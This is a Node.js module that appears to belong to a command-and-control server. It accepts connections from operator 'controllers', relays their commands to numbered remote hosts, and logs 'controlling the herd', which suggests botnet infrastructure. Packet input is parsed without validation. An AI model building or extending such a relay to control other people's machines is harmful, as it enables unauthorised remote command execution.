const { Socket } = require('net');
const { PacketConnection } = require('../protocol/connection');
const { createPacket, parsePacket, serializePacket } = require('../protocol/packet');
const host = require('./host');

/**
 * @type Controller[]
 */
const controllers = [];

class Controller {
    /**
     * @param {Socket} socket
     */
    constructor(socket) {
        this.connection = new PacketConnection(socket);
        this.connection.on('packet', (data) => {
            //TODO: validate json-parsed packet
            this.handleCommand(JSON.parse(data.toString()));
        });
    }

    /**
     * Handle command received from controller
     * @param {*} packet
     */
    handleCommand(packet) {
        switch (packet._ptype.name) {
            case 'relaycommand':
                try {
                    if (packet.id < 0 || packet.id >= host.hosts.length) {
                        throw new Error('invalid host ID');
                    }
                    host.hosts[packet.id].sendCommand(packet.command);
                } catch (err) {
                    console.error(err);
                    this.send(wrapErrorPacket(err))
                }
                break;
            default:
                //TODO: handle invalid packet type
                break;
        }
    }

    /**
     * Send packet to this controller
     * @param {*} packet
     */
    send(packet) {
        this.connection.write(JSON.stringify(packet));
    }
}

/**
 * Wrap error in packet for sending to host
 * @param {Error} err 
 */
function wrapErrorPacket(err) {
    let errPacket = createPacket('control', 'response', 'servererror');
    errPacket.message = err.toString();
    return errPacket; //TODO
}

/**
 * @param {Socket} socket
 */
function handleIncomingController(socket) {
    let controller = new Controller(socket);
    controllers.push(controller);
    console.log(`[+] Now controlling the herd from ${socket.remoteAddress}`);
    socket.on('close', () => {
        console.log(`[-] Controller ${socket.remoteAddress} disconnected`);
        controllers.splice(controllers.findIndex(i => i == controller), 1);
    });
    socket.on('error', () => {
        console.log(`[!] Controller ${socket.remoteAddress} forcibly exited`);
        controllers.splice(controllers.findIndex(i => i == controller), 1);
    });
}

exports.Controller = Controller;
exports.handleIncomingController = handleIncomingController;
exports.controllers = controllers;
